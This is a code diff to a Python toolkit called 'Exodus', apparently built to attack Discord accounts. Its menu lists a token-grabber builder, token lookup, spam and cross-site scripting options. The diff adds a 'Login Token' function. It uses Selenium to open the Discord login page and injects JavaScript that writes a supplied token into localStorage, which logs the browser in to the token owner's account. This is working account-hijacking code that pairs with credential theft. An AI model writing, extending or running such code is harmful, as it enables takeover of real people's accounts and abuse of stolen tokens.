@@ -6,6 +6,7 @@ from requests import get, post, delete
 from webbrowser import open_new
 from pypresence import Presence
 from tkinter import filedialog
+from selenium import webdriver
 from Crypto.Cipher import AES
 from base64 import b64encode
 from random import randint
@@ -396,6 +397,15 @@ def Credits():
 """)
     i(f" {Col.purple}[{Col.red}*{Col.purple}] {Col.white}Presiona enter para salir..." + exit)
 
+def Login():
+    System.Title("Exodus  ^| Login Token")
+    login = i(f" {Col.purple}[{Col.red}*{Col.purple}] Token {Col.red}> {Col.white}")
+    driver = webdriver.Chrome('chromedriver.exe')
+    driver.get('https://discord.com/login')
+    payload = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
+    sleep(3)
+    driver.execute_script(payload + f'login("{login}")')
+
 class Exodus:
     StatusConnection(), install()
     while True:
@@ -410,7 +420,7 @@ class Exodus:
              █    ▐     ▄▀  ▄▀            █     ▐              ▐      
              ▐         █    ▐             ▐                                                           
             ╭─━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─╮
-              [1] MSN                   
+              [1] MSN                   [7] Login Token
               [2] Build Token Grabber      
               [3] Discord Invite                 
               [4] Token Info                
@@ -433,6 +443,8 @@ class Exodus:
             AnySpam()
         if CH1 == '6':
             XCSS()
+        if CH1 == '7':
+            Login()
         if CH1 == 'x' or CH1.upper() == 'X':
             Credits()
         if CH1 == '0':
